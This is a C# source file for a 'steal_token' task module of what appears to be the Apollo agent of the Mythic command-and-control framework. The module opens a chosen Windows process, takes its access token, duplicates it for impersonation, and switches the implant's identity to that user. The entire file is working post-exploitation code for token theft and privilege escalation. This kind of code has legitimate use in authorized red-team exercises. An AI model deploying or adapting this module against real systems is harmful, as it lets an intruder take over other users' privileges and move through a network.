#define COMMAND_NAME_UPPER

#if DEBUG
#define STEAL_TOKEN
#endif

#if STEAL_TOKEN

using ApolloInterop.Classes;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class steal_token : Tasking
    {
        private delegate bool OpenProcessToken(
            IntPtr hProcessHandle,
            TokenAccessLevels dwDesiredAccess,
            out IntPtr hTokenHandle);
        private delegate bool DuplicateTokenEx(
            IntPtr hExistingToken,
            TokenAccessLevels dwDesiredAccess,
            IntPtr lpTokenAttributes,
            TokenImpersonationLevel dwImpersonationLevel,
            int dwTokenType,
            out IntPtr phNewToken);
        private delegate void CloseHandle(IntPtr hHandle);

        private OpenProcessToken _pOpenProcessToken;
        private DuplicateTokenEx _pDuplicateTokenEx;
        private CloseHandle _pCloseHandle;

        public steal_token(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
            _pOpenProcessToken = _agent.GetApi().GetLibraryFunction<OpenProcessToken>(Library.ADVAPI32, "OpenProcessToken");
            _pDuplicateTokenEx = _agent.GetApi().GetLibraryFunction<DuplicateTokenEx>(Library.ADVAPI32, "DuplicateTokenEx");
            _pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
        }


        public override void Start()
        {
            string errorMessage = "";
            TaskResponse resp = new TaskResponse { };
            IntPtr procHandle = IntPtr.Zero;
            IntPtr hImpersonationToken = IntPtr.Zero;
            IntPtr hProcessToken = IntPtr.Zero;
            try
            {
                procHandle = System.Diagnostics.Process.GetProcessById((int) Convert.ToInt32(_data.Parameters)).Handle;
            }
            catch (Exception ex)
            {
                errorMessage = $"Failed to acquire process handle to {_data.Parameters}: {ex.Message}";
            }

            if (procHandle != IntPtr.Zero)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("", false, "", new IMythicMessage[]
                    {
                        Artifact.ProcessOpen(int.Parse(_data.Parameters))
                    }));
                bool bRet = _pOpenProcessToken(
                    procHandle,
                    TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary | TokenAccessLevels.Query,
                    out hProcessToken);
                if (!bRet)
                {
                    errorMessage = $"Failed to open process token: {Marshal.GetLastWin32Error()}";
                }
                else
                {
                    _agent.GetIdentityManager().SetPrimaryIdentity(hProcessToken);
                    bRet = _pDuplicateTokenEx(
                        hProcessToken,
                        TokenAccessLevels.MaximumAllowed,
                        IntPtr.Zero,
                        TokenImpersonationLevel.Impersonation,
                        1, // TokenImpersonation
                        out hImpersonationToken);
                    if (!bRet)
                    {
                        errorMessage = $"Failed to duplicate token for impersonation: {Marshal.GetLastWin32Error()}";
                    }
                    else
                    {
                        _agent.GetIdentityManager().SetImpersonationIdentity(hImpersonationToken);
                        var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
                        resp = CreateTaskResponse(
                            $"Successfully impersonated {cur.Name}",
                            true);
                    }
                }
            }

            if (!string.IsNullOrEmpty(errorMessage))
            {
                resp = CreateTaskResponse(errorMessage, true, "error");
            }

            if (hProcessToken != IntPtr.Zero)
            {
                _pCloseHandle(hProcessToken);
            }

            if (hImpersonationToken != IntPtr.Zero)
            {
                _pCloseHandle(hImpersonationToken);
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif